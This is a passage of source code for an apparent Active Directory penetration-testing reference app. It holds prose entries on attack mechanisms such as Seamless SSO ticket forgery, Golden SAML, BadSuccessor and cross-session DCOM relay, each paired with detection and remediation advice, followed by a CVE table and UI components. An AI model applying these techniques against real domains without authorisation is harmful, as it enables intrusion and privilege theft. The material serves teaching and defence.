    title: "Honeytokens and canary accounts — the defensive mirror image",
    why: "Every attack in this reference has a detection angle worth knowing, and this is one specifically designed to catch the reference's own techniques in the act.",
    body: "A honeytoken (or canary account) is a decoy AD object deliberately planted to look valuable to an attacker — a fake service account with an enticing SPN sitting there specifically to be Kerberoasted, a decoy user with 'admin' in its name that no legitimate process ever touches, or a canary object whose ACL is configured to alert the moment anyone reads or writes to it. The account itself has no real privilege and no legitimate reason to ever be accessed, which is exactly what makes any interaction with it a near-zero-false-positive detection signal — legitimate admin tooling and users simply never touch it.",
    effect: "From the defender's side, a single well-placed honeytoken can catch a Kerberoasting sweep, an LDAP enumeration pass, or a password spray long before the attacker reaches anything real — and from the attacker's side, it's a reminder that not every SPN-bearing or interesting-looking account in an enumeration result is actually worth pursuing. Products like Microsoft Defender for Identity build deception features around exactly this idea.",
    detection: "On the defensive side, this *is* the detection mechanism — any authentication attempt, LDAP query touching, or Kerberos ticket request against a designated honeytoken account should alert immediately, since there's no legitimate reason for it to ever occur.",
    remediation: "For blue teams: seed a small number of realistic-looking decoy accounts/objects across common attacker targets (SPN-bearing accounts, admin-sounding usernames, tempting file shares) and alert on any interaction with zero tolerance, since false positives should be structurally impossible if the honeytoken is never referenced by real processes.",
  },

  // ---------------- Hybrid identity, Golden SAML, cleanup discipline ----------------

  {
    id: "hybrid-identity-fundamentals",
    category: "credaccess",
    title: "Why hybrid identity collapses the on-prem/cloud boundary",
    why: "Almost every real AD environment today is hybrid-joined, which means the on-prem/cloud split most security thinking still assumes doesn't actually hold — compromise on one side routinely becomes compromise on the other.",
    body: "Azure AD Connect (or Entra Connect) synchronizes on-prem AD objects into Entra ID using a dedicated sync account that, by default, holds Replicating Directory Changes rights on-prem — the same rights DCSync abuses. That sync account's credentials live in a local database on the AAD Connect server, recoverable by anyone with local admin there. In the other direction, Seamless SSO and AD FS federation both let an on-prem credential or key silently authenticate a user to Entra ID, meaning an on-prem compromise can reach cloud resources (including Global Admin) without ever touching a cloud-side credential at all.",
    effect: "The AAD Connect server and, if present, the AD FS server should both be treated as Tier 0 infrastructure — compromising either one collapses the boundary between on-prem AD and the entire Entra ID tenant, in both directions.",
  },
  {
    id: "seamless-sso-mechanism",
    category: "credaccess",
    title: "How Seamless SSO abuse works",
    why: "A textbook case of a convenience feature becoming a backdoor — the same design that makes SSO silent for legitimate users makes forged access silent too.",
    body: "Seamless SSO works by having a domain-joined device request a Kerberos service ticket for a special computer account (AZUREADSSOACC$) from an on-prem DC, then hand that ticket to Entra ID, which validates it because it shares that account's Kerberos key. Since the sharing already exists, an attacker who recovers AZUREADSSOACC$'s hash — which only requires standard DCSync-equivalent rights, nothing Entra-specific — can forge a Kerberos ticket for that service directly, entirely offline, for any synced user's on-prem SID.",
    effect: "Full Entra ID access as any synced user, obtained purely through on-prem AD rights, with no interaction with Entra ID's own authentication stack at all — since Seamless SSO is designed not to prompt for MFA, this routinely bypasses it too.",
    detection: "Monitor Kerberos service ticket requests for the AZUREADSSOACC$ SPN from unexpected source hosts, and audit who can read that computer account's credential material via replication rights.",
    remediation: "Treat AZUREADSSOACC$'s password like a Tier 0 secret — rotating it (Microsoft provides a script for this) invalidates every forged ticket. Disabling Seamless SSO entirely removes the feature if it's not actually needed.",
  },
  {
    id: "golden-saml-mechanism",
    category: "adcs",
    title: "Golden SAML — forging federation trust itself",
    why: "The cloud-federation equivalent of a golden ticket, and arguably more dangerous — it doesn't touch Kerberos or krbtgt at all, so on-prem detection built around Kerberos anomalies won't see it.",
    body: "AD FS proves a user's identity to Entra ID (and any other connected application) by signing a SAML token with a private certificate that only AD FS holds. Whoever holds that certificate can sign their own SAML tokens entirely offline, claiming to be any user in the federated directory — including Global Admins — without any interaction with AD FS, Entra ID's authentication stack, or MFA at all, since the forged token simply asserts the authentication already happened.",
    effect: "Domain-wide-equivalent access to every application trusting this AD FS instance, most critically Microsoft 365 — and because it's a signature over an assertion rather than a live protocol exchange, it survives on-prem password resets and even krbtgt rotation entirely, since neither is involved.",
    detection: "Anomalous SAML token issuance patterns — tokens with unusual claims, issued without a corresponding real AD FS authentication event, or immutable IDs that don't match expected sign-in patterns.",
    remediation: "Rotate the AD FS token-signing certificate immediately if any compromise is suspected — this is the only thing that invalidates already-forged tokens. Harden the DKM container ACLs (see CVE-2026-56155) and treat the AD FS server itself as Tier 0.",
  },
  {
    id: "cleanup-discipline",
    category: "acl",
    title: "Why cleanup is part of the technique, not an afterthought",
    why: "Every persistence-style technique in this reference (Shadow Credentials, RBCD, ACL writes, template reconfiguration) leaves a standing artifact — planting it is only half the job on a real engagement.",
    body: "Unlike a forged ticket (which is stateless and simply expires) or a DCSync (which reads but doesn't write anything), ACL-based and object-based techniques modify real, persistent AD state: a Shadow Credential sits in msDS-KeyCredentialLink until removed, an RBCD entry sits in msDS-AllowedToActOnBehalfOfOtherIdentity until removed, a WriteDacl-granted ACE sits on the object's DACL until removed, and a reconfigured certificate template stays exploitable until restored. None of these self-revert. A good habit before running any of these: capture a restore point first — `dacledit.py -action backup` before any ACL write, `certipy template -save-old` before any template change, note the exact RBCD/Shadow Credential values before adding them — so cleanup is a known, verifiable revert rather than a best-effort guess at the end of an engagement.",
    effect: "An engagement that plants persistence and never removes it leaves the client's environment measurably less secure than before testing started — the standing artifacts are real privilege escalation paths for anyone who finds them later, tester or not.",
  },

  // ---------------- BadSuccessor (dMSA privilege inheritance abuse) ----------------

  {
    id: "badsuccessor-mechanism",
    category: "acl",
    title: "BadSuccessor — how a Windows Server 2025 migration feature became a privesc primitive",
    why: "One of the most severe low-effort-to-impact ratios in this entire reference — Create Child rights on any single OU, which is an extremely common delegation, escalates directly to the privilege level of any account in the domain.",
    body: "Windows Server 2025 introduced delegated Managed Service Accounts (dMSAs) as a migration path away from legacy service accounts — a dMSA can be configured to 'succeed' an existing account via the msDS-ManagedAccountPrecededByLink attribute, and Windows treats this as a genuine identity migration: authentication as the dMSA is honored as if it carries the preceded account's own privileges, including its group memberships and any special rights. Creating a dMSA object only requires Create Child rights on an OU (specifically, the msDS-DelegatedManagedServiceAccount object class) — a delegation so common it's often granted to helpdesk-tier groups without a second thought — and there was no requirement that the attacker actually control or have any relationship with the account being 'succeeded.' An attacker with Create Child rights on essentially any OU could create a dMSA, point its predecessor link at any account in the domain (a Domain Admin, for instance), and then authenticate as the dMSA to inherit that account's effective privilege.",
    effect: "Full privilege escalation to the level of any targeted account — commonly Domain Admin — from a starting position (OU-level Create Child rights) that's dramatically less privileged than almost every other technique in this reference requires.",
    detection: "Monitor for dMSA object creation events and audit any newly-set msDS-ManagedAccountPrecededByLink attribute values, especially where the linked account is privileged and has no legitimate migration relationship to the new dMSA. Microsoft and BloodHound both added detection/graph support for this relationship shortly after public disclosure.",
    remediation: "Apply Microsoft's guidance/patches addressing this issue, and audit who holds Create Child (or full OU control) broadly across the domain — this technique makes that specific delegation far more dangerous than it was previously assumed to be. Restrict which OUs are allowed to contain dMSA objects if your environment doesn't need the dMSA migration feature at all.",
  },

  // ---------------- Cross-Session Activation (RemotePotato0) ----------------

  {
    id: "cross-session-activation-mechanism",
    category: "acl",
    title: "Cross-Session Activation — coercing a privileged session's DCOM auth",
    why: "Every Potato-family technique (PrintSpoofer, GodPotato, RoguePotato) depends on the current account holding SeImpersonatePrivilege — Cross-Session Activation is the answer for the more common case where it doesn't.",
    body: "DCOM activation normally happens within the calling session — but certain DCOM server configurations let a low-privilege process request that a DCOM object be activated in a *different* logon session on the same machine (RemotePotato0's specific technique abuses this via the IRemoteSCMActivator/IUnknown activation path against a target session ID). If that other session belongs to a more privileged user — a domain admin with an open RDP or console session, for instance — the DCOM activation causes that session's identity to authenticate back to the attacker's chosen endpoint, exactly as if that user had connected to it directly. Pointed at an ntlmrelayx.py listener instead of a real service, that authentication gets relayed rather than completed, handing the attacker whatever the privileged session's identity can reach.",
    effect: "Local-to-domain privilege escalation on any multi-user host (jump boxes, RDS/Terminal Servers, shared admin workstations) where a privileged account is simultaneously logged on — without ever needing SeImpersonatePrivilege, so it works in contexts where every Potato variant is a dead end.",
    detection: "Monitor for DCOM activation requests targeting a session ID other than the caller's own, and for NTLM authentication events immediately followed by a relay-typical access pattern (LDAP writes, SMB connections) from a service account context. Unusual RPC/DCOM traffic on 135 combined with an immediate NTLM auth spike is the practical signal.",
    remediation: "Avoid leaving privileged interactive/RDP sessions open on shared or lower-trust hosts — this is fundamentally a session-hygiene issue, not a patchable bug. Enforce SMB signing and LDAP signing/channel binding so the relayed authentication can't be used even if captured.",
  },

];

// ============================================================
// CVE DATABASE — every CVE referenced throughout this reference,
// consolidated into its own browsable/searchable section.
// ============================================================
const CVE_SEVERITY_COLORS = {
  Critical: "#E06C5C",
  High: "#E0A937",
  Medium: "#5B9BD5",
};

const CVES = [
  {
    id: "cve-2020-1472",
    cveId: "CVE-2020-1472",
    title: "Zerologon",
    severity: "Critical",
    cvss: "10.0",
    disclosed: "August 2020",
    summary: "A flaw in Netlogon's AES-CFB8 IV handling lets an unauthenticated attacker reset a domain controller's own machine account password to empty, then DCSync the entire domain.",
    relatedTools: ["zerologon_tester.py", "cve-2020-1472-exploit.py", "secretsdump.py"],
    learnId: "zerologon-mechanism",
    seeAlso: { label: "See related commands + mechanism", query: "Zerologon" },
  },
  {
    id: "cve-2021-34527",
    cveId: "CVE-2021-34527 / CVE-2021-1675",
    title: "PrintNightmare",
    severity: "Critical",
    cvss: "8.8",
    disclosed: "July 2021",
    summary: "The print spooler's RpcAddPrinterDriver RPC call lets a low-privileged domain account install an attacker-supplied driver DLL, which the spooler loads and runs as SYSTEM — both remotely and locally.",
    relatedTools: ["CVE-2021-1675.py"],
    learnId: "printnightmare-mechanism",
    seeAlso: { label: "See related commands + mechanism", query: "PrintNightmare" },
  },
  {
    id: "cve-2021-42287-42278",
    cveId: "CVE-2021-42287 / CVE-2021-42278",
    title: "noPac (sAMAccountName spoofing)",
    severity: "Critical",
    cvss: "8.8",
    disclosed: "November–December 2021",
    summary: "A gap between sAMAccountName validation and Kerberos ticket issuance lets an attacker impersonate a domain controller by renaming a low-privilege-created computer account.",
    relatedTools: ["noPac.py"],
    learnId: null,
    seeAlso: { label: "See related commands", query: "noPac" },
  },
  {
    id: "cve-2022-26923",
    cveId: "CVE-2022-26923",
    title: "Certifried",
    severity: "Critical",
    cvss: "8.8",
    disclosed: "May 2022",
    summary: "Before the patch, any domain user could create a computer account via MachineAccountQuota and rewrite its dNSHostName to match an existing DC's hostname, letting AD CS's default Machine template issue them a certificate that authenticates as that DC.",
    relatedTools: ["addcomputer.py", "certipy account update", "certipy req"],
    learnId: "certifried-mechanism",
    seeAlso: { label: "See related commands + mechanism", query: "Certifried" },
  },
  {
    id: "cve-2026-25177",
    cveId: "CVE-2026-25177",
    title: "AD DS SPN/UPN naming collision",
    severity: "High",
    cvss: "8.8",
    disclosed: "March 10, 2026",
    summary: "Unicode character injection (zero-width spaces, homoglyphs, BOM markers) into SPN/UPN values can bypass AD's forest-wide uniqueness enforcement, causing Kerberos ticket mis-issuance — root cause per independent research, not vendor-confirmed mechanics.",
    relatedTools: [],
    learnId: "cve-2026-25177",
    seeAlso: { label: "See full writeup", query: "CVE-2026-25177" },
  },
  {
    id: "cve-2026-24297",
    cveId: "CVE-2026-24297",
    title: "Windows Kerberos security feature bypass",
    severity: "Medium",
    cvss: null,
    disclosed: "March 2026",
    summary: "A race condition in the Windows Kerberos implementation lets an attacker circumvent a Kerberos-enforced protection during a narrow group-policy reapplication window.",
    relatedTools: [],
    learnId: "cve-2026-24297",
    seeAlso: { label: "See full writeup", query: "CVE-2026-24297" },
  },
  {
    id: "cve-2026-25171",
    cveId: "CVE-2026-25171",
    title: "Windows Authentication Methods use-after-free",
    severity: "High",
    cvss: null,
    disclosed: "March 2026",
    summary: "A use-after-free in the Windows authentication subsystem's credential/token processing lets an attacker with initial local access trigger memory corruption for elevated-privilege code execution.",
    relatedTools: [],
    learnId: "cve-2026-25171",
    seeAlso: { label: "See full writeup", query: "CVE-2026-25171" },
  },
  {
    id: "cve-2026-56155",
    cveId: "CVE-2026-56155",
    title: "AD FS Distributed Key Manager EoP",
    severity: "Critical",
    cvss: null,
    disclosed: "July 2026 — actively exploited, on CISA's KEV catalog",
    summary: "Overly-permissive ACLs on the AD FS DKM container let an authenticated local attacker reach admin on the AD FS server and, from there, the token-signing/encryption certificate keys — enabling forged authentication tokens for any federated identity.",
    relatedTools: [],
    learnId: "cve-2026-56155",
    seeAlso: { label: "See full writeup, actively exploited", query: "CVE-2026-56155" },
  },
  {
    id: "cve-2025-58726-2026-26128",
    cveId: "CVE-2025-58726 / CVE-2026-26128",
    title: "Kerberos reflective relay via Unicode normalization",
    severity: "High",
    cvss: null,
    disclosed: "Patched March 2026",
    summary: "Unicode lookalike characters in a DNS hostname normalize identically for LDAP SPN matching but differently for loopback detection, letting a coerced machine's Kerberos authentication be reflected back to itself — the Kerberos counterpart to earlier NTLM reflective-relay bypasses.",
    relatedTools: ["krbrelayx.py", "dnstool.py", "PetitPotam.py"],
    learnId: "cve-2025-58726-2026-26128",
    seeAlso: { label: "See full writeup", query: "CVE-2025-58726" },
  },
  {
    id: "cve-2024-49019",
    cveId: "CVE-2024-49019",
    title: "ADCS ESC15 (EKUwu) — arbitrary application policy",
    severity: "Critical",
    cvss: null,
    disclosed: "Patched November 2024",
    summary: "Schema version 1 certificate templates that allow SAN specification process a client-suppliable Application Policy extension — which Windows treats as higher priority than EKUs — letting a requester embed Certificate Request Agent or Client Authentication into a certificate the template was never configured to permit.",
    relatedTools: ["certipy"],
    learnId: null,
    seeAlso: { label: "See related commands", query: "ESC15" },
  },
];

function CopyButton({ text, label }) {
  const [copied, setCopied] = useState(false);
  const [hover, setHover] = useState(false);
  return (
    <button
      onClick={async () => {
        try {
          await navigator.clipboard.writeText(text);
          setCopied(true);
          setTimeout(() => setCopied(false), 1500);
        } catch (e) {}
      }}
      onMouseEnter={() => setHover(true)}
      onMouseLeave={() => setHover(false)}
      className="flex items-center gap-1.5 px-2.5 py-1 rounded-md text-xs font-medium transition-colors"
      style={{
        background: copied ? "rgba(63,191,166,0.15)" : hover ? SIGNATURE + "1A" : BORDER_1,
        color: copied ? "#3FBFA6" : hover ? SIGNATURE : STRUCTURAL,
        border: `1px solid ${copied ? "rgba(63,191,166,0.3)" : hover ? SIGNATURE + "55" : BORDER_2}`,
        fontFamily: FONT_MONO,
      }}
    >
      {copied ? <Check size={13} /> : <Copy size={13} />}
      {copied ? "Copied" : label || "Copy"}
    </button>
  );
}

// Renders the command with filled-in values in the accent color and
// still-empty $TOKENS dimmed + underlined, so it's obvious what's left to fill.
function CommandLine({ command, values, shell }) {
  const sortedVars = [...VARS].sort((a, b) => b.key.length - a.key.length);
  const pattern = new RegExp(`(\\$(?:${sortedVars.map((v) => v.key).join("|")}))`, "g");
  const parts = command.split(pattern);
  return (
    <>
      {parts.map((part, i) => {
        const varMatch = sortedVars.find((v) => `$${v.key}` === part);
        if (!varMatch) return <React.Fragment key={i}>{part}</React.Fragment>;
        const val = values[varMatch.key];
        if (val) {
          const display = shell === "bash" ? bashQuote(val) : val;
          return (
            <span key={i} style={{ color: "#3FBFA6", fontWeight: 600 }}>
              {display}
            </span>
          );
        }
        return (
          <span key={i} style={{ color: "#5B6470", textDecoration: "underline", textDecorationStyle: "dotted" }}>
            {part}
          </span>
        );
      })}
    </>
  );
}

function EntryCard({ entry, values }) {
  const phase = phaseOf(entry.phase);
  const shell = shellOf(entry);
  const repoUrl = repoFor(entry.tool);
  const variants = getCommandVariants(entry.command).map((v) => ({ ...v, command: applyAuthPreference(v.command, values) }));
  const multi = variants.length > 1;
  const [hover, setHover] = useState(false);

  return (
    <div
      onMouseEnter={() => setHover(true)}
      onMouseLeave={() => setHover(false)}
      className="rounded-lg border overflow-hidden flex flex-col transition-colors"
      style={{ borderColor: hover ? SIGNATURE + "40" : BORDER_2, background: SURFACE }}
    >
      <div className="px-4 pt-3.5 pb-3 flex items-start justify-between gap-3">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span
              className="text-[10px] uppercase tracking-wider font-semibold px-1.5 py-0.5 rounded"
              style={{ color: phase.color, background: phase.bg, fontFamily: FONT_MONO }}
            >
              {phase.label}
            </span>
          </div>
          <h3 className="text-[15px] leading-snug" style={{ fontFamily: FONT_MONO, fontWeight: 600, color: TEXT_PRIMARY }}>
            {entry.title}
          </h3>
          {repoUrl ? (
            <a
              href={repoUrl}
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center gap-1 text-xs mt-0.5 hover:underline"
              style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}
            >
              <Github size={11} />
              {entry.tool}
            </a>
          ) : (
            <p className="text-xs mt-0.5" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
              {entry.tool}
            </p>
          )}
        </div>
      </div>

      <div className="px-4 space-y-2">
        {variants.map((v, i) => (
          <div key={i}>
            {v.label && (
              <p className="text-[10px] uppercase tracking-wide mb-1" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
                {v.label}
              </p>
            )}
            <div
              className="rounded-md px-3 py-2.5 text-[12.5px] overflow-x-auto whitespace-pre"
              style={{ background: VOID, color: TEXT_COMMAND, border: `1px solid ${BORDER_1}`, fontFamily: FONT_MONO }}
            >
              <CommandLine command={v.command} values={values} shell={shell} />
            </div>
          </div>
        ))}
      </div>

      <div className="px-4 py-3 flex items-start justify-between gap-3 mt-1">
        <div className="space-y-1.5 flex-1">
          <p className="text-[13px] leading-relaxed" style={{ color: TEXT_BODY }}>{entry.description}</p>
          <p className="text-[12px] leading-relaxed" style={{ color: phase.color }}>
            <span className="font-semibold">Use case — </span>
            {entry.useCase}
          </p>
        </div>
        {multi ? (
          <div className="flex flex-col gap-1.5 shrink-0">
            {variants.map((v, i) => (
              <CopyButton key={i} text={substitute(v.command, values, shell)} label={`Copy ${i === 0 ? "1" : i + 1}`} />
            ))}
          </div>
        ) : (
          <CopyButton text={substitute(variants[0].command, values, shell)} />
        )}
      </div>
    </div>
  );
}

// Inline brand mark — lucide-react ships generic outline icons only, no
// Discord glyph, so this is the Simple Icons Discord path (CC0) drawn as a
// plain currentColor SVG so it inherits color/hover like every lucide icon
// used alongside it.
function DiscordIcon({ size = 13, style }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" fill="currentColor" style={style} aria-hidden="true">
      <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.522 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z" />
    </svg>
  );
}

// One nav row — owns its own hover state (same pattern EdgeCard/EntryCard use
// elsewhere) rather than lifting a "hoveredKey" into the parent.
function MenuNavItem({ item, active, onClick }) {
  const [hover, setHover] = useState(false);
  const color = item.color || SIGNATURE;
  return (
    <button
      onMouseEnter={() => setHover(true)}
      onMouseLeave={() => setHover(false)}
      onClick={onClick}
      className="w-full flex items-center gap-2.5 text-left px-4 py-2.5 text-[13px] transition-colors"
      style={{
        fontFamily: FONT_MONO,
        color: active ? color : hover ? TEXT_PRIMARY : TEXT_BODY,
        background: active ? color + "14" : hover ? BORDER_1 : "transparent",
        borderLeft: `2px solid ${active ? color : "transparent"}`,
      }}
    >
      {item.Icon ? (
        <item.Icon size={14} style={{ color: active ? color : STRUCTURAL, flexShrink: 0 }} />
      ) : (
        <span className="shrink-0 rounded-full" style={{ width: 6, height: 6, background: color }} />
      )}
      <span className="truncate">{item.label}</span>
    </button>
  );
}

function MenuLink({ label, url, Icon }) {
  const [hover, setHover] = useState(false);
  return (
    <a
      href={url}
      target="_blank"
      rel="noopener noreferrer"
      onMouseEnter={() => setHover(true)}
      onMouseLeave={() => setHover(false)}
      className="flex items-center gap-2.5 px-4 py-2 text-[12px] transition-colors"
      style={{ fontFamily: FONT_MONO, color: hover ? SIGNATURE : STRUCTURAL, background: hover ? BORDER_1 : "transparent" }}
    >
      <Icon size={13} style={{ flexShrink: 0 }} />
      {label}
    </a>
  );
}

// ============================================================
// MENU DRAWER — collapsed icon in the header; clicking it pops a
// left-side drawer combining top-level views (Commands/AttackPaths/
// Learnbook/CVEs) and Commands' phase filters into one flat sitemap,
// since the list is short enough that splitting them into separate
// menus just adds a click for no benefit. Stays mounted (rather than
// unmounting on close) so both the backdrop fade and the panel slide
// animate in both directions.
// ============================================================
function MenuDrawer({ open, onClose, view, setView, activePhase, setActivePhase, edgeMode, setEdgeMode }) {
  const navItems = [
    { kind: "view", id: "commands", label: "CN=Commands", Icon: Terminal },
    ...PHASES.map((p) => ({ kind: "phase", id: p.id, label: p.label, color: p.color })),
    { kind: "edgeMode", id: "edge-lookup", edgeMode: "edges", label: "CN=EdgeLookup", Icon: GitBranch },
    { kind: "edgeMode", id: "attack-chains", edgeMode: "chains", label: "CN=AttackChains", Icon: Workflow },
    { kind: "view", id: "learnbook", label: "CN=Learnbook", Icon: BookOpen },
    { kind: "view", id: "cves", label: "CN=CVEs", Icon: ShieldAlert },
  ];

  const links = [
    { label: "GitHub", url: "https://github.com/Gh0ulH4x/AD-arsenal", Icon: Github },
    { label: "GTFOBins", url: "https://gtfobins.github.io/", Icon: ExternalLink },
    { label: "revshells.com", url: "https://revshells.com/", Icon: ExternalLink },
    // Placeholder — swap url with the real invite link when ready.
    { label: "Discord Community", url: "#", Icon: DiscordIcon },
  ];

  const isActive = (item) => {
    if (item.kind === "view") return view === item.id && (item.id !== "commands" || activePhase === "all");
    if (item.kind === "edgeMode") return view === "edges" && edgeMode === item.edgeMode;
    return view === "commands" && activePhase === item.id;
  };

  const select = (item) => {
    if (item.kind === "view") {
      setView(item.id);
      if (item.id === "commands") setActivePhase("all");
    } else if (item.kind === "edgeMode") {
      setView("edges");
      setEdgeMode(item.edgeMode);
    } else {
      setView("commands");
      setActivePhase(item.id);
    }
    onClose();
  };

  return (
    <>
      <div
        onClick={onClose}
        aria-hidden={!open}
        className="menu-drawer-backdrop fixed inset-0 z-40"
        style={{
          background: "rgba(0,0,0,0.55)",
          backdropFilter: "blur(1px)",
          opacity: open ? 1 : 0,
          pointerEvents: open ? "auto" : "none",
        }}
      />
      <div
        className="menu-drawer-panel fixed left-0 top-0 h-full z-50 flex flex-col"
        style={{
          width: 264,
          background: SURFACE,
          borderRight: `1px solid ${BORDER_2}`,
          boxShadow: open ? "4px 0 24px rgba(0,0,0,0.25)" : "none",
          transform: `translateX(${open ? "0" : "-100%"})`,
          pointerEvents: open ? "auto" : "none",
        }}
      >
        <div className="flex items-center justify-between px-4 py-4" style={{ borderBottom: `1px solid ${BORDER_1}` }}>
          <div className="flex items-center gap-2">
            <FolderTree size={14} style={{ color: SIGNATURE }} />
            <span className="text-[11px] tracking-[0.18em] uppercase" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
              Menu
            </span>
          </div>
          <button
            onClick={onClose}
            aria-label="Close menu"
            className="flex items-center justify-center rounded-md transition-colors"
            style={{ width: 26, height: 26, color: STRUCTURAL }}
            onMouseEnter={(e) => {
              e.currentTarget.style.color = TEXT_PRIMARY;
              e.currentTarget.style.background = BORDER_1;
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.color = STRUCTURAL;
              e.currentTarget.style.background = "transparent";
            }}
          >
            <X size={15} />
          </button>
        </div>
        <div className="flex-1 overflow-y-auto py-2">
          {navItems.map((item) => (
            <MenuNavItem key={`${item.kind}-${item.id}`} item={item} active={isActive(item)} onClick={() => select(item)} />
          ))}
        </div>

        {/* External references — the project's own repo plus the two upstream
            reference sites (GTFOBins, revshells.com) this dataset draws on/pairs with. */}
        <div className="py-2" style={{ borderTop: `1px solid ${BORDER_1}` }}>
          {links.map((link) => (
            <MenuLink key={link.label} {...link} />
          ))}
        </div>
      </div>
    </>
  );
}

// ============================================================
// TOOLS FACET — the ~90 distinct tool names across ENTRIES, grouped
// alphabetically with their own scroll region so the sidebar doesn't
// have to grow to fit them. Click a tool to narrow Commands to just
// that tool's entries; click again to clear.
// ============================================================
function ToolsFacet({ activeTool, setActiveTool }) {
  const toolGroups = useMemo(() => {
    const names = [...new Set(ENTRIES.map((e) => e.tool))].sort((a, b) => a.localeCompare(b));
    const groups = new Map();
    for (const name of names) {
      const letter = /[A-Za-z]/.test(name[0]) ? name[0].toUpperCase() : "#";
      if (!groups.has(letter)) groups.set(letter, []);
      groups.get(letter).push(name);
    }
    return [...groups.entries()].sort(([a], [b]) => a.localeCompare(b));
  }, []);

  return (
    <div
      className="rounded-lg border shrink-0 flex flex-col"
      style={{ width: 200, background: SURFACE, borderColor: BORDER_2, maxHeight: 640 }}
    >
      <div className="px-3 py-2.5 flex items-center justify-between" style={{ borderBottom: `1px solid ${BORDER_1}` }}>
        <span className="text-[11px] uppercase tracking-wide font-semibold" style={{ color: TEXT_PRIMARY, fontFamily: FONT_MONO }}>
          Tools
        </span>
        {activeTool !== "all" && (
          <button
            onClick={() => setActiveTool("all")}
            className="text-[10px]"
            style={{ color: SIGNATURE, fontFamily: FONT_MONO }}
          >
            Clear
          </button>
        )}
      </div>
      <div className="overflow-y-auto px-1 py-1">
        {toolGroups.map(([letter, tools]) => (
          <div key={letter}>
            <div className="px-2 pt-2 pb-1 text-[10px]" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
              {letter}
            </div>
            {tools.map((tool) => (
              <button
                key={tool}
                onClick={() => setActiveTool(activeTool === tool ? "all" : tool)}
                className="w-full text-left px-2 py-1 rounded text-[12px] truncate block"
                style={{
                  fontFamily: FONT_MONO,
                  color: activeTool === tool ? SIGNATURE : TEXT_BODY,
                  background: activeTool === tool ? SIGNATURE + "14" : "transparent",
                }}
                title={tool}
              >
                {tool}
              </button>
            ))}
          </div>
        ))}
      </div>
    </div>
  );
}

function VariablePanel({ values, setValues }) {
  const [open, setOpen] = useState(true);
  const filledCount = VARS.filter((v) => values[v.key]).length;

  return (
    <div
      className="rounded-lg border mb-6 overflow-hidden"
      style={{ borderColor: BORDER_2, background: SURFACE }}
    >
      <button
        onClick={() => setOpen(!open)}
        className="w-full flex items-center justify-between px-4 py-3"
      >
        <div className="flex items-center gap-2">
          <Pencil size={14} style={{ color: SIGNATURE }} />
          <span className="text-sm font-semibold" style={{ color: TEXT_PRIMARY }}>
            Your variables
          </span>
          <span className="text-[11px]" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
            {filledCount}/{VARS.length} set
          </span>
        </div>
        <ChevronRight
          size={16}
          className="transition-transform"
          style={{ transform: open ? "rotate(90deg)" : "rotate(0deg)", color: STRUCTURAL }}
        />
      </button>
      {open && (
        <div className="px-4 pb-4">
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
            {VARS.map((v) => (
              <label key={v.key} className="flex flex-col gap-1">
                <span className="text-[10px] uppercase tracking-wide" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
                  ${v.key}
                </span>
                <input
                  type="text"
                  value={values[v.key] || ""}
                  onChange={(e) => setValues((prev) => ({ ...prev, [v.key]: e.target.value }))}
                  placeholder={v.placeholder}
                  autoComplete="off"
                  autoCorrect="off"
                  autoCapitalize="off"
                  spellCheck="false"
                  className="text-[13px] rounded-md px-2.5 py-1.5 outline-none"
                  style={{ background: VOID, border: `1px solid ${BORDER_2}`, color: TEXT_PRIMARY, fontFamily: FONT_MONO }}
                />
              </label>
            ))}
          </div>
          {filledCount > 0 && (
            <button
              onClick={() => setValues({})}
              className="mt-3 text-[11px] transition-colors"
              style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}
              onMouseEnter={(e) => (e.currentTarget.style.color = SIGNATURE)}
              onMouseLeave={(e) => (e.currentTarget.style.color = STRUCTURAL)}
            >
              Clear all
            </button>
          )}
        </div>
      )}
    </div>
  );
}

// ============================================================
// EDGE EXPLORER — search a BloodHound edge name, get the
// connected exploitation chain using the same variables/quoting
// as the Commands tab.
// ============================================================
function EdgeCard({ edge, values }) {
  const cat = edgeCategoryOf(edge.category);
  const [hover, setHover] = useState(false);
  return (
    <div
      onMouseEnter={() => setHover(true)}
      onMouseLeave={() => setHover(false)}
      className="rounded-lg border overflow-hidden transition-colors"
      style={{ borderColor: hover ? SIGNATURE + "40" : BORDER_2, background: SURFACE }}
    >
